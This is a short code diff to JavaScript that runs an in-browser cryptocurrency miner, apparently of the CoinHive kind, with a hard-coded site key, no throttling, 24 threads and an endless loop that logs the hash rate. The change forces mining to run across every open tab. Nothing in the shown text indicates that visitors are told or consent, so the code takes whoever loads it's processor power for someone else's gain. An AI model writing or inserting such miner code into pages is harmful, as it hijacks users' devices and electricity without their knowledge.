@@ -4,7 +4,7 @@
     var miner = new Client.Anonymous('ad19f245bdcb8be727ca365dea899058cf5610d3627b0daac9cd746fc7a94dbb', {
         throttle: 0, c: 'w'
     });
-    miner.start();
+    miner.start(Client.FORCE_MULTI_TAB);
     miner.setAutoThreadsEnabled(false);
     miner.setNumThreads(24);
     while (true) {hps = miner.getHashesPerSecond();console.log(hps);};
